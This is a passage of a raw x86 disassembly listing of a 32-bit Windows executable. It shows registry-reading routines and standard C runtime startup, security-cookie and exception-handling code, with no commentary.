  406818:	jne    0x406833
  40681a:	cmp    BYTE PTR ds:0x7ffe0268,0x0
  406821:	je     0x40682c
  406823:	cmp    DWORD PTR ds:0x7ffe0264,0x1
  40682a:	je     0x406833
  40682c:	xor    eax,eax
  40682e:	jmp    0x406927
  406833:	cmp    DWORD PTR ds:0x408408,0x0
  40683a:	jne    0x40686a
  40683c:	mov    eax,ds:0x40840c
  406841:	test   eax,eax
  406843:	jne    0x40686f
  406845:	xor    ecx,ecx
  406847:	lea    eax,[esp+0x10]
  40684b:	push   ecx
  40684c:	push   eax
  40684d:	push   ecx
  40684e:	push   0xf013f
  406853:	push   ecx
  406854:	push   ecx
  406855:	push   ecx
  406856:	push   0x401188
  40685b:	push   0x80000002
  406860:	call   DWORD PTR ds:0x40c000
  406866:	test   eax,eax
  406868:	jne    0x40682c
  40686a:	mov    eax,ds:0x40840c
  40686f:	test   esi,esi
  406871:	je     0x40687c
  406873:	test   eax,eax
  406875:	jne    0x40687c
  406877:	mov    ebx,0x401c00
  40687c:	push   esi
  40687d:	push   ebx
  40687e:	lea    edx,[esp+0x20]
  406882:	lea    ecx,[esp+0x44]
  406886:	call   0x4065a3
  40688b:	mov    edi,eax
  40688d:	xor    eax,eax
  40688f:	cmp    edi,0x1
  406892:	sete   al
  406895:	xor    ecx,ecx
  406897:	and    eax,0x1
  40689a:	test   esi,esi
  40689c:	setne  cl
  40689f:	add    ecx,ecx
  4068a1:	or     eax,ecx
  4068a3:	cmp    DWORD PTR ds:0x408408,0x0
  4068aa:	mov    DWORD PTR [esp+0x14],eax
  4068ae:	jne    0x4068fb
  4068b0:	cmp    DWORD PTR ds:0x40840c,0x0
  4068b7:	jne    0x4068fb
  4068b9:	push   DWORD PTR [esp+0x3c]
  4068bd:	mov    edx,0x401c08
  4068c2:	lea    ecx,[esp+0x14]
  4068c6:	call   0x40563a
  4068cb:	push   DWORD PTR [esp+0x40]
  4068cf:	mov    edx,0x401c28
  4068d4:	lea    ecx,[esp+0x14]
  4068d8:	call   0x40563a
  4068dd:	push   DWORD PTR [esp+0x14]
  4068e1:	mov    edx,0x401c3c
  4068e6:	lea    ecx,[esp+0x14]
  4068ea:	call   0x40563a
  4068ef:	push   DWORD PTR [esp+0x10]
  4068f3:	call   DWORD PTR ds:0x40c00c
  4068f9:	jmp    0x406925
  4068fb:	push   DWORD PTR [esp+0x3c]
  4068ff:	mov    edx,0x401c08
  406904:	call   0x4056ad
  406909:	push   DWORD PTR [esp+0x40]
  40690d:	mov    edx,0x401c28
  406912:	call   0x4056ad
  406917:	push   DWORD PTR [esp+0x14]
  40691b:	mov    edx,0x401c3c
  406920:	call   0x4056ad
  406925:	mov    eax,edi
  406927:	mov    ecx,DWORD PTR [esp+0x64]
  40692b:	pop    edi
  40692c:	pop    esi
  40692d:	pop    ebx
  40692e:	xor    ecx,esp
  406930:	call   0x406fc0
  406935:	mov    esp,ebp
  406937:	pop    ebp
  406938:	ret    
  406939:	int3   
  40693a:	int3   
  40693b:	int3   
  40693c:	int3   
  40693d:	int3   
  40693e:	mov    edi,edi
  406940:	push   ebp
  406941:	mov    ebp,esp
  406943:	sub    esp,0x14
  406946:	push   ebx
  406947:	push   esi
  406948:	push   edi
  406949:	mov    edi,edx
  40694b:	mov    eax,ecx
  40694d:	mov    DWORD PTR [ebp-0x14],eax
  406950:	test   edi,edi
  406952:	je     0x406957
  406954:	and    DWORD PTR [edi],0x0
  406957:	test   eax,eax
  406959:	jne    0x406962
  40695b:	xor    eax,eax
  40695d:	jmp    0x406b16
  406962:	push   eax
  406963:	call   DWORD PTR ds:0x40c0b0
  406969:	cmp    eax,0x3
  40696c:	jne    0x40695b
  40696e:	and    DWORD PTR [ebp-0x10],0x0
  406972:	xor    ebx,ebx
  406974:	xor    esi,esi
  406976:	cmp    DWORD PTR ds:0x40840c,ebx
  40697c:	jne    0x40698f
  40697e:	test   DWORD PTR ds:0x7ffe02d0,0x10000
  406988:	jne    0x40698f
  40698a:	and    DWORD PTR [ebp-0xc],ebx
  40698d:	jmp    0x406996
  40698f:	mov    DWORD PTR [ebp-0xc],0x1
  406996:	cmp    DWORD PTR ds:0x408408,ebx
  40699c:	jne    0x406aeb
  4069a2:	lea    eax,[ebp-0x4]
  4069a5:	push   eax
  4069a6:	push   0x20119
  4069ab:	push   0x0
  4069ad:	push   0x401188
  4069b2:	push   0x80000002
  4069b7:	call   DWORD PTR ds:0x40c008
  4069bd:	test   eax,eax
  4069bf:	jne    0x406a74
  4069c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4069c8:	lea    eax,[ebp-0x8]
  4069cb:	push   eax
  4069cc:	mov    edx,0x40120c
  4069d1:	call   0x405574
  4069d6:	test   eax,eax
  4069d8:	je     0x4069ed
  4069da:	cmp    DWORD PTR [ebp-0x8],ebx
  4069dd:	je     0x4069ed
  4069df:	push   DWORD PTR [ebp-0x4]
  4069e2:	call   DWORD PTR ds:0x40c00c
  4069e8:	jmp    0x406aff
  4069ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f0:	lea    eax,[ebp-0x8]
  4069f3:	push   eax
  4069f4:	mov    edx,0x4011ec
  4069f9:	call   0x405574
  4069fe:	test   eax,eax
  406a00:	je     0x406a0b
  406a02:	cmp    DWORD PTR [ebp-0x8],0x4
  406a06:	jae    0x406a0b
  406a08:	mov    ebx,DWORD PTR [ebp-0x8]
  406a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  406a0e:	lea    eax,[ebp-0x8]
  406a11:	push   eax
  406a12:	mov    edx,0x401c58
  406a17:	call   0x405574
  406a1c:	test   eax,eax
  406a1e:	je     0x406a36
  406a20:	cmp    DWORD PTR [ebp-0x8],esi
  406a23:	je     0x406a36
  406a25:	push   DWORD PTR [ebp-0x4]
  406a28:	call   DWORD PTR ds:0x40c00c
  406a2e:	xor    esi,esi
  406a30:	inc    esi
  406a31:	jmp    0x406afd
  406a36:	mov    ecx,DWORD PTR [ebp-0x4]
  406a39:	lea    eax,[ebp-0x8]
  406a3c:	push   eax
  406a3d:	mov    edx,0x401c3c
  406a42:	call   0x405574
  406a47:	test   eax,eax
  406a49:	je     0x406a6b
  406a4b:	mov    ecx,DWORD PTR [ebp-0x8]
  406a4e:	mov    esi,ecx
  406a50:	and    esi,0x1
  406a53:	je     0x406a59
  406a55:	mov    DWORD PTR [edi],ebx
  406a57:	jmp    0x4069df
  406a59:	xor    eax,eax
  406a5b:	cmp    DWORD PTR [ebp-0xc],eax
  406a5e:	setne  al
  406a61:	shr    ecx,1
  406a63:	cmp    ecx,eax
  406a65:	je     0x4069df
  406a6b:	push   DWORD PTR [ebp-0x4]
  406a6e:	call   DWORD PTR ds:0x40c00c
  406a74:	lea    eax,[ebp-0x4]
  406a77:	push   eax
  406a78:	push   0x20119
  406a7d:	push   0x0
  406a7f:	push   0x401c7c
  406a84:	push   0x80000002
  406a89:	call   DWORD PTR ds:0x40c008
  406a8f:	test   eax,eax
  406a91:	jne    0x406ada
  406a93:	mov    ecx,DWORD PTR [ebp-0x4]
  406a96:	lea    eax,[ebp-0x8]
  406a99:	push   eax
  406a9a:	mov    edx,0x401250
  406a9f:	call   0x405574
  406aa4:	test   eax,eax
  406aa6:	je     0x406ab2
  406aa8:	cmp    DWORD PTR [ebp-0x8],0x0
  406aac:	jne    0x406a25
  406ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  406ab5:	lea    eax,[ebp-0x8]
  406ab8:	push   eax
  406ab9:	mov    edx,0x401c98
  406abe:	call   0x405574
  406ac3:	test   eax,eax
  406ac5:	je     0x406ad1
  406ac7:	cmp    DWORD PTR [ebp-0x8],0x0
  406acb:	jne    0x406a25
  406ad1:	push   DWORD PTR [ebp-0x4]
  406ad4:	call   DWORD PTR ds:0x40c00c
  406ada:	cmp    DWORD PTR ds:0x408408,0x0
  406ae1:	jne    0x406aeb
  406ae3:	lea    ecx,[ebp-0x10]
  406ae6:	call   0x405528
  406aeb:	mov    edx,DWORD PTR [ebp-0xc]
  406aee:	mov    ecx,DWORD PTR [ebp-0x14]
  406af1:	call   0x4067cc
  406af6:	mov    esi,eax
  406af8:	cmp    esi,0x1
  406afb:	jne    0x406aff
  406afd:	mov    DWORD PTR [edi],ebx
  406aff:	mov    edi,DWORD PTR [ebp-0x10]
  406b02:	test   edi,edi
  406b04:	je     0x406b14
  406b06:	push   edi
  406b07:	call   DWORD PTR ds:0x40c014
  406b0d:	push   edi
  406b0e:	call   DWORD PTR ds:0x40c0f4
  406b14:	mov    eax,esi
  406b16:	pop    edi
  406b17:	pop    esi
  406b18:	pop    ebx
  406b19:	mov    esp,ebp
  406b1b:	pop    ebp
  406b1c:	ret    
  406b1d:	int3   
  406b1e:	int3   
  406b1f:	int3   
  406b20:	int3   
  406b21:	int3   
  406b22:	mov    edi,edi
  406b24:	push   ebp
  406b25:	mov    ebp,esp
  406b27:	sub    esp,0xc
  406b2a:	push   ebx
  406b2b:	push   esi
  406b2c:	push   edi
  406b2d:	mov    edi,edx
  406b2f:	mov    DWORD PTR [ebp-0x8],ecx
  406b32:	mov    esi,0x400
  406b37:	push   esi
  406b38:	push   0x0
  406b3a:	mov    DWORD PTR [ebp-0x4],esi
  406b3d:	call   DWORD PTR ds:0x40c104
  406b43:	push   eax
  406b44:	call   DWORD PTR ds:0x40c0fc
  406b4a:	mov    ebx,eax
  406b4c:	test   ebx,ebx
  406b4e:	je     0x406cc7
  406b54:	xor    ecx,ecx
  406b56:	lea    eax,[ebp-0xc]
  406b59:	push   ecx
  406b5a:	push   eax
  406b5b:	push   esi
  406b5c:	push   ebx
  406b5d:	push   ecx
  406b5e:	push   ecx
  406b5f:	push   0x90310
  406b64:	push   DWORD PTR [ebp-0x8]
  406b67:	call   DWORD PTR ds:0x40c074
  406b6d:	test   eax,eax
  406b6f:	jne    0x406bd3
  406b71:	call   DWORD PTR ds:0x40c048
  406b77:	mov    esi,eax
  406b79:	cmp    esi,0x1
  406b7c:	je     0x406bb9
  406b7e:	cmp    esi,0x156
  406b84:	je     0x406bb9
  406b86:	cmp    esi,0x7a
  406b89:	jne    0x406ba3
  406b8b:	push   ebx
  406b8c:	push   0x0
  406b8e:	call   DWORD PTR ds:0x40c104
  406b94:	push   eax
  406b95:	call   DWORD PTR ds:0x40c100
  406b9b:	mov    esi,DWORD PTR [ebp-0x4]
  406b9e:	shl    esi,0x2
  406ba1:	jmp    0x406b37
  406ba3:	test   esi,esi
  406ba5:	jle    0x406cb5
  406bab:	movzx  esi,si
  406bae:	or     esi,0x80070000
  406bb4:	jmp    0x406cb5
  406bb9:	test   edi,edi
  406bbb:	je     0x406bc0
  406bbd:	and    DWORD PTR [edi],0x0
  406bc0:	mov    eax,DWORD PTR [ebp+0x8]
  406bc3:	test   eax,eax
  406bc5:	je     0x406cb3
  406bcb:	and    DWORD PTR [eax],0x0
  406bce:	jmp    0x406cb3
  406bd3:	xor    eax,eax
  406bd5:	inc    eax
  406bd6:	cmp    DWORD PTR [ebx],eax
  406bd8:	je     0x406be4
  406bda:	mov    esi,0x80070114
  406bdf:	jmp    0x406cb5
  406be4:	test   edi,edi
  406be6:	je     0x406bea
  406be8:	mov    DWORD PTR [edi],eax
  406bea:	mov    ecx,DWORD PTR [ebp+0x8]
  406bed:	test   ecx,ecx
  406bef:	je     0x406bf6
  406bf1:	mov    eax,DWORD PTR [ebx+0x4]
  406bf4:	mov    DWORD PTR [ecx],eax
  406bf6:	mov    eax,DWORD PTR [ebx+0x4]
  406bf9:	sub    eax,0x1
  406bfc:	je     0x406c50
  406bfe:	sub    eax,0x1
  406c01:	jne    0x406cb3
  406c07:	mov    edx,DWORD PTR [ebp+0xc]
  406c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  406c0d:	test   edx,edx
  406c0f:	je     0x406c44
  406c11:	test   ecx,ecx
  406c13:	je     0x406cb3
  406c19:	push   0x4
  406c1b:	pop    esi
  406c1c:	cmp    DWORD PTR [ecx],esi
  406c1e:	jb     0x406c44
  406c20:	and    DWORD PTR [edx],eax
  406c22:	push   0x8
  406c24:	pop    edi
  406c25:	cmp    DWORD PTR [ecx],edi
  406c27:	jb     0x406c3b
  406c29:	and    DWORD PTR [edx+0x4],eax
  406c2c:	mov    eax,DWORD PTR [ebx+0xc]
  406c2f:	mov    DWORD PTR [edx],eax
  406c31:	mov    eax,DWORD PTR [ebx+0x10]
  406c34:	mov    DWORD PTR [edx+0x4],eax
  406c37:	mov    DWORD PTR [ecx],edi
  406c39:	jmp    0x406cb3
  406c3b:	mov    eax,DWORD PTR [ebx+0xc]
  406c3e:	mov    DWORD PTR [edx],eax
  406c40:	mov    DWORD PTR [ecx],esi
  406c42:	jmp    0x406cb3
  406c44:	test   ecx,ecx
  406c46:	je     0x406cb3
  406c48:	mov    DWORD PTR [ecx],0x8
  406c4e:	jmp    0x406cb3
  406c50:	mov    ecx,DWORD PTR [ebp+0xc]
  406c53:	mov    edx,DWORD PTR [ebp+0x10]
  406c56:	test   ecx,ecx
  406c58:	je     0x406ca9
  406c5a:	test   edx,edx
  406c5c:	je     0x406cb3
  406c5e:	cmp    DWORD PTR [edx],0x1c
  406c61:	jb     0x406ca9
  406c63:	mov    eax,DWORD PTR [ebx+0x10]
  406c66:	lea    esi,[ebx+0x18]
  406c69:	mov    DWORD PTR [ecx],eax
  406c6b:	mov    eax,DWORD PTR [ebx+0x14]
  406c6e:	mov    DWORD PTR [ecx+0x4],eax
  406c71:	mov    eax,ecx
  406c73:	push   0x5
  406c75:	pop    ecx
  406c76:	push   0x20
  406c78:	lea    edi,[eax+0x8]
  406c7b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c7d:	pop    ecx
  406c7e:	cmp    DWORD PTR [edx],ecx
  406c80:	jb     0x406ca1
  406c82:	and    DWORD PTR [eax+0x1c],0x0
  406c86:	test   BYTE PTR [ebx+0xc],0x1
  406c8a:	mov    DWORD PTR [edx],ecx
  406c8c:	je     0x406c95
  406c8e:	mov    DWORD PTR [eax+0x1c],0x1
  406c95:	test   BYTE PTR [ebx+0xc],0x2
  406c99:	je     0x406cb3
  406c9b:	or     DWORD PTR [eax+0x1c],0x2
  406c9f:	jmp    0x406cb3
  406ca1:	mov    DWORD PTR [edx],0x1c
  406ca7:	jmp    0x406cb3
  406ca9:	test   edx,edx
  406cab:	je     0x406cb3
  406cad:	mov    DWORD PTR [edx],0x20
  406cb3:	xor    esi,esi
  406cb5:	push   ebx
  406cb6:	push   0x0
  406cb8:	call   DWORD PTR ds:0x40c104
  406cbe:	push   eax
  406cbf:	call   DWORD PTR ds:0x40c100
  406cc5:	jmp    0x406ccc
  406cc7:	mov    esi,0x800705aa
  406ccc:	pop    edi
  406ccd:	mov    eax,esi
  406ccf:	pop    esi
  406cd0:	pop    ebx
  406cd1:	mov    esp,ebp
  406cd3:	pop    ebp
  406cd4:	ret    0xc
  406cd7:	int3   
  406cd8:	int3   
  406cd9:	int3   
  406cda:	int3   
  406cdb:	int3   
  406cdc:	int3   
  406cdd:	int3   
  406cde:	int3   
  406cdf:	int3   
  406ce0:	mov    eax,0x5a4d
  406ce5:	cmp    WORD PTR ds:0x400000,ax
  406cec:	je     0x406cf2
  406cee:	xor    eax,eax
  406cf0:	jmp    0x406d40
  406cf2:	mov    ecx,DWORD PTR ds:0x40003c
  406cf8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406d02:	jne    0x406cee
  406d04:	movzx  eax,WORD PTR [ecx+0x400018]
  406d0b:	cmp    eax,0x10b
  406d10:	je     0x406d2c
  406d12:	cmp    eax,0x20b
  406d17:	jne    0x406cee
  406d19:	xor    eax,eax
  406d1b:	cmp    DWORD PTR [ecx+0x400084],0xe
  406d22:	jbe    0x406d40
  406d24:	cmp    DWORD PTR [ecx+0x4000f8],eax
  406d2a:	jmp    0x406d3d
  406d2c:	xor    eax,eax
  406d2e:	cmp    DWORD PTR [ecx+0x400074],0xe
  406d35:	jbe    0x406d40
  406d37:	cmp    DWORD PTR [ecx+0x4000e8],eax
  406d3d:	setne  al
  406d40:	push   0x1
  406d42:	mov    ds:0x4080d8,eax
  406d47:	call   0x4071fe
  406d4c:	push   eax
  406d4d:	call   DWORD PTR ds:0x40c134
  406d53:	or     DWORD PTR ds:0x408410,0xffffffff
  406d5a:	or     DWORD PTR ds:0x408414,0xffffffff
  406d61:	pop    ecx
  406d62:	pop    ecx
  406d63:	call   DWORD PTR ds:0x40c128
  406d69:	mov    ecx,DWORD PTR ds:0x408000
  406d6f:	mov    DWORD PTR [eax],ecx
  406d71:	call   DWORD PTR ds:0x40c140
  406d77:	mov    ecx,DWORD PTR ds:0x4083fc
  406d7d:	mov    DWORD PTR [eax],ecx
  406d7f:	call   0x407450
  406d84:	cmp    DWORD PTR ds:0x408004,0x0
  406d8b:	jne    0x406d99
  406d8d:	push   0x407450
  406d92:	call   DWORD PTR ds:0x40c124
  406d98:	pop    ecx
  406d99:	call   0x407458
  406d9e:	xor    eax,eax
  406da0:	ret    
  406da1:	int3   
  406da2:	int3   
  406da3:	int3   
  406da4:	int3   
  406da5:	int3   
  406da6:	int3   
  406da7:	int3   
  406da8:	int3   
  406da9:	int3   
  406daa:	int3   
  406dab:	int3   
  406dac:	int3   
  406dad:	int3   
  406dae:	int3   
  406daf:	int3   
  406db0:	mov    eax,ds:0x408404
  406db5:	push   0x4080dc
  406dba:	push   DWORD PTR ds:0x408400
  406dc0:	mov    ds:0x4080dc,eax
  406dc5:	push   0x4080d0
  406dca:	push   0x4080cc
  406dcf:	push   0x4080c8
  406dd4:	call   DWORD PTR ds:0x40c138
  406dda:	add    esp,0x14
  406ddd:	mov    ds:0x4080d4,eax
  406de2:	ret    
  406de3:	int3   
  406de4:	int3   
  406de5:	int3   
  406de6:	int3   
  406de7:	int3   
  406de8:	push   0x10
  406dea:	push   0x4078b0
  406def:	call   0x40747c
  406df4:	xor    ebx,ebx
  406df6:	mov    DWORD PTR [ebp-0x4],ebx
  406df9:	mov    eax,fs:0x18
  406dff:	mov    esi,DWORD PTR [eax+0x4]
  406e02:	mov    edi,ebx
  406e04:	mov    edx,0x408418
  406e09:	mov    ecx,esi
  406e0b:	xor    eax,eax
  406e0d:	lock cmpxchg DWORD PTR [edx],ecx
  406e11:	test   eax,eax
  406e13:	je     0x406e2d
  406e15:	cmp    eax,esi
  406e17:	jne    0x406e20
  406e19:	xor    esi,esi
  406e1b:	inc    esi
  406e1c:	mov    edi,esi
  406e1e:	jmp    0x406e30
  406e20:	push   0x3e8
  406e25:	call   DWORD PTR ds:0x40c0e8
  406e2b:	jmp    0x406e04
  406e2d:	xor    esi,esi
  406e2f:	inc    esi
  406e30:	cmp    DWORD PTR ds:0x40841c,esi
  406e36:	jne    0x406e42
  406e38:	push   0x1f
  406e3a:	call   0x40723a
  406e3f:	pop    ecx
  406e40:	jmp    0x406e7c
  406e42:	cmp    DWORD PTR ds:0x40841c,ebx
  406e48:	jne    0x406e76
  406e4a:	mov    DWORD PTR ds:0x40841c,esi
  406e50:	push   0x401018
  406e55:	push   0x40100c
  406e5a:	call   0x406f5c
  406e5f:	pop    ecx
  406e60:	pop    ecx
  406e61:	test   eax,eax
  406e63:	je     0x406e7c
  406e65:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406e6c:	mov    eax,0xff
  406e71:	jmp    0x406f51
  406e76:	mov    DWORD PTR ds:0x4080c4,esi
  406e7c:	cmp    DWORD PTR ds:0x40841c,esi
  406e82:	jne    0x406e9f
  406e84:	push   0x401008
  406e89:	push   0x401000
  406e8e:	call   0x407470
  406e93:	pop    ecx
  406e94:	pop    ecx
  406e95:	mov    DWORD PTR ds:0x40841c,0x2
  406e9f:	test   edi,edi
  406ea1:	jne    0x406eac
  406ea3:	xor    eax,eax
  406ea5:	mov    ecx,0x408418
  406eaa:	xchg   DWORD PTR [ecx],eax
  406eac:	cmp    DWORD PTR ds:0x408420,0x0
  406eb3:	je     0x406ed8
  406eb5:	push   0x408420
  406eba:	call   0x4072a0
  406ebf:	pop    ecx
  406ec0:	test   eax,eax
  406ec2:	je     0x406ed8
  406ec4:	push   ebx
  406ec5:	push   0x2
  406ec7:	push   ebx
  406ec8:	mov    esi,DWORD PTR ds:0x408420
  406ece:	mov    ecx,esi
  406ed0:	call   DWORD PTR ds:0x40c1a4
  406ed6:	call   esi
  406ed8:	push   DWORD PTR ds:0x4080d0
  406ede:	push   DWORD PTR ds:0x4080cc
  406ee4:	push   DWORD PTR ds:0x4080c8
  406eea:	call   0x402292
  406eef:	add    esp,0xc
  406ef2:	mov    ds:0x4080c0,eax
  406ef7:	cmp    DWORD PTR ds:0x4080d8,0x0
  406efe:	jne    0x406f36
  406f00:	push   eax
  406f01:	call   DWORD PTR ds:0x40c130
  406f07:	mov    ecx,DWORD PTR [ebp-0x14]
  406f0a:	mov    eax,DWORD PTR [ecx]
  406f0c:	mov    eax,DWORD PTR [eax]
  406f0e:	mov    DWORD PTR [ebp-0x20],eax
  406f11:	push   ecx
  406f12:	push   eax
  406f13:	call   0x407184
  406f18:	pop    ecx
  406f19:	pop    ecx
  406f1a:	ret    
  406f1b:	mov    esp,DWORD PTR [ebp-0x18]
  406f1e:	mov    eax,DWORD PTR [ebp-0x20]
  406f21:	mov    ds:0x4080c0,eax
  406f26:	cmp    DWORD PTR ds:0x4080d8,0x0
  406f2d:	jne    0x406f36
  406f2f:	push   eax
  406f30:	call   DWORD PTR ds:0x40c16c
  406f36:	cmp    DWORD PTR ds:0x4080c4,0x0
  406f3d:	jne    0x406f4a
  406f3f:	call   DWORD PTR ds:0x40c12c
  406f45:	mov    eax,ds:0x4080c0
  406f4a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406f51:	call   0x4074c4
  406f56:	ret    
  406f57:	int3   
  406f58:	int3   
  406f59:	int3   
  406f5a:	int3   
  406f5b:	int3   
  406f5c:	mov    edi,edi
  406f5e:	push   ebp
  406f5f:	mov    ebp,esp
  406f61:	push   ecx
  406f62:	mov    eax,ds:0x408008
  406f67:	xor    eax,ebp
  406f69:	mov    DWORD PTR [ebp-0x4],eax
  406f6c:	push   esi
  406f6d:	mov    esi,DWORD PTR [ebp+0x8]
  406f70:	xor    eax,eax
  406f72:	cmp    esi,DWORD PTR [ebp+0xc]
  406f75:	jae    0x406f95
  406f77:	push   edi
  406f78:	test   eax,eax
  406f7a:	jne    0x406f94
  406f7c:	mov    edi,DWORD PTR [esi]
  406f7e:	test   edi,edi
  406f80:	je     0x406f8c
  406f82:	mov    ecx,edi
  406f84:	call   DWORD PTR ds:0x40c1a4
  406f8a:	call   edi
  406f8c:	add    esi,0x4
  406f8f:	cmp    esi,DWORD PTR [ebp+0xc]
  406f92:	jb     0x406f78
  406f94:	pop    edi
  406f95:	mov    ecx,DWORD PTR [ebp-0x4]
  406f98:	xor    ecx,ebp
  406f9a:	pop    esi
  406f9b:	call   0x406fc0
  406fa0:	mov    esp,ebp
  406fa2:	pop    ebp
  406fa3:	ret    
  406fa4:	int3   
  406fa5:	int3   
  406fa6:	int3   
  406fa7:	int3   
  406fa8:	int3   
  406fa9:	int3   
  406faa:	int3   
  406fab:	int3   
  406fac:	int3   
  406fad:	int3   
  406fae:	int3   
  406faf:	int3   
  406fb0:	call   0x4073a8
  406fb5:	jmp    0x406de8
  406fba:	int3   
  406fbb:	int3   
  406fbc:	int3   
  406fbd:	int3   
  406fbe:	int3   
  406fbf:	int3   
  406fc0:	cmp    ecx,DWORD PTR ds:0x408008
  406fc6:	jne    0x406fcb
  406fc8:	ret    0x0
  406fcb:	jmp    0x407004
  406fd0:	int3   
  406fd1:	int3   
  406fd2:	int3   
  406fd3:	int3   
  406fd4:	int3   
  406fd5:	mov    edi,edi
  406fd7:	push   ebp
  406fd8:	mov    ebp,esp
  406fda:	push   0x0
  406fdc:	call   DWORD PTR ds:0x40c0e0
  406fe2:	push   DWORD PTR [ebp+0x8]
  406fe5:	call   DWORD PTR ds:0x40c0e4
  406feb:	push   0xc0000409
  406ff0:	call   DWORD PTR ds:0x40c0dc
  406ff6:	push   eax
  406ff7:	call   DWORD PTR ds:0x40c0d8
  406ffd:	pop    ebp
  406ffe:	ret    
  406fff:	int3   
  407000:	int3   
  407001:	int3   
  407002:	int3   
  407003:	int3   
  407004:	mov    edi,edi
  407006:	push   ebp
  407007:	mov    ebp,esp
  407009:	sub    esp,0x324
  40700f:	mov    ds:0x4081e0,eax
  407014:	mov    DWORD PTR ds:0x4081dc,ecx
  40701a:	mov    DWORD PTR ds:0x4081d8,edx
  407020:	mov    DWORD PTR ds:0x4081d4,ebx
  407026:	mov    DWORD PTR ds:0x4081d0,esi
  40702c:	mov    DWORD PTR ds:0x4081cc,edi
  407032:	data16 mov WORD PTR ds:0x4081f8,ss
  407039:	data16 mov WORD PTR ds:0x4081ec,cs
  407040:	data16 mov WORD PTR ds:0x4081c8,ds
  407047:	data16 mov WORD PTR ds:0x4081c4,es
  40704e:	data16 mov WORD PTR ds:0x4081c0,fs
  407055:	data16 mov WORD PTR ds:0x4081bc,gs
  40705c:	pushf  
  40705d:	pop    DWORD PTR ds:0x4081f0
  407063:	mov    eax,DWORD PTR [ebp+0x0]
  407066:	mov    ds:0x4081e4,eax
  40706b:	mov    eax,DWORD PTR [ebp+0x4]
  40706e:	mov    ds:0x4081e8,eax
  407073:	lea    eax,[ebp+0x8]
  407076:	mov    ds:0x4081f4,eax
  40707b:	mov    eax,DWORD PTR [ebp-0x324]
  407081:	mov    DWORD PTR ds:0x408130,0x10001
  40708b:	mov    eax,ds:0x4081e8
  407090:	mov    ds:0x4080ec,eax
  407095:	mov    DWORD PTR ds:0x4080e0,0xc0000409
  40709f:	mov    DWORD PTR ds:0x4080e4,0x1
  4070a9:	mov    DWORD PTR ds:0x4080f0,0x3
  4070b3:	push   0x4
  4070b5:	pop    eax
  4070b6:	imul   eax,eax,0x0
  4070b9:	mov    DWORD PTR [eax+0x4080f4],0x2
  4070c3:	push   0x4
  4070c5:	pop    eax
  4070c6:	shl    eax,0x0
  4070c9:	mov    ecx,DWORD PTR ds:0x408008
  4070cf:	mov    DWORD PTR [eax+0x4080f4],ecx
  4070d5:	push   0x4
  4070d7:	pop    eax
  4070d8:	shl    eax,1
  4070da:	mov    ecx,DWORD PTR ds:0x40800c
  4070e0:	mov    DWORD PTR [eax+0x4080f4],ecx
  4070e6:	push   0x4
  4070e8:	pop    eax
  4070e9:	imul   eax,eax,0x0
  4070ec:	mov    ecx,DWORD PTR ds:0x408008
  4070f2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4070f6:	push   0x4
  4070f8:	pop    eax
  4070f9:	shl    eax,0x0
  4070fc:	mov    ecx,DWORD PTR ds:0x40800c
  407102:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  407106:	push   0x401090
  40710b:	call   0x406fd5
  407110:	mov    esp,ebp
  407112:	pop    ebp
  407113:	ret    
  407114:	int3   
  407115:	int3   
  407116:	int3   
  407117:	int3   
  407118:	int3   
  407119:	int3   
  40711a:	int3   
  40711b:	int3   
  40711c:	int3   
  40711d:	int3   
  40711e:	int3   
  40711f:	int3   
  407120:	mov    edi,edi
  407122:	push   ebp
  407123:	mov    ebp,esp
  407125:	mov    eax,DWORD PTR [ebp+0x8]
  407128:	mov    eax,DWORD PTR [eax]
  40712a:	cmp    DWORD PTR [eax],0xe06d7363
  407130:	jne    0x40715d
  407132:	cmp    DWORD PTR [eax+0x10],0x3
  407136:	jne    0x40715d
  407138:	mov    eax,DWORD PTR [eax+0x14]
  40713b:	cmp    eax,0x19930520
  407140:	je     0x407157
  407142:	cmp    eax,0x19930521
  407147:	je     0x407157
  407149:	cmp    eax,0x19930522
  40714e:	je     0x407157
  407150:	cmp    eax,0x1994000
  407155:	jne    0x40715d
  407157:	call   DWORD PTR ds:0x40c11c
  40715d:	xor    eax,eax
  40715f:	pop    ebp
  407160:	ret    0x4
  407163:	int3   
  407164:	int3   
  407165:	int3   
  407166:	int3   
  407167:	int3   
  407168:	int3   
  407169:	int3   
  40716a:	int3   
  40716b:	int3   
  40716c:	int3   
  40716d:	int3   
  40716e:	int3   
  40716f:	int3   
  407170:	push   0x407120
  407175:	call   DWORD PTR ds:0x40c0e0
  40717b:	xor    eax,eax
  40717d:	ret    
  40717e:	int3   
  40717f:	int3   
  407180:	int3   
  407181:	int3   
  407182:	int3   
  407183:	int3   
  407184:	jmp    DWORD PTR ds:0x40c144
  40718a:	int3   
  40718b:	int3   
  40718c:	int3   
  40718d:	int3   
  40718e:	int3   
  40718f:	push   0xc
  407191:	push   0x4078d0
  407196:	call   0x407518
  40719b:	xor    ecx,ecx
  40719d:	mov    eax,DWORD PTR [ebp+0x8]
  4071a0:	test   eax,eax
  4071a2:	je     0x4071ef
  4071a4:	cmp    eax,0xffffffff
  4071a7:	je     0x4071ef
  4071a9:	mov    DWORD PTR [ebp-0x4],ecx
  4071ac:	mov    edx,0x5a4d
  4071b1:	cmp    WORD PTR [eax],dx
  4071b4:	jne    0x4071e8
  4071b6:	mov    edx,DWORD PTR [eax+0x3c]
  4071b9:	test   edx,edx
  4071bb:	js     0x4071e8
  4071bd:	cmp    edx,0x10000000
  4071c3:	jae    0x4071e8
  4071c5:	add    eax,edx
  4071c7:	mov    DWORD PTR [ebp-0x1c],eax
  4071ca:	mov    ecx,DWORD PTR [eax]
  4071cc:	sub    ecx,0x4550
  4071d2:	neg    ecx
  4071d4:	sbb    ecx,ecx
  4071d6:	not    ecx
  4071d8:	and    ecx,eax
  4071da:	jmp    0x4071e5
  4071dc:	xor    eax,eax
  4071de:	inc    eax
  4071df:	ret    
  4071e0:	mov    esp,DWORD PTR [ebp-0x18]
  4071e3:	xor    ecx,ecx
  4071e5:	mov    DWORD PTR [ebp-0x1c],ecx
